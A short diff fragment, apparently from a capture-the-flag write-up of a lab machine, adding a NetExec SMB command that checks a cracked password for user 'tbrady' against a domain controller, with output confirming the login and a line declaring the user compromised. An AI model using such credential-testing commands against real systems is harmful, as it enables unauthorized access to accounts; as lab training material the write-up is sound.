@@ -412,5 +412,10 @@ tbrady:543BOMBOMBUNmanda
 Ill validate these credentials
 
 ```python
-
+nxc smb dc01.rebound.htb -u 'tbrady' -p '543BOMBOMBUNmanda'       
+SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.14.17    445    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda
 ```
+This user is now compromised
+
+
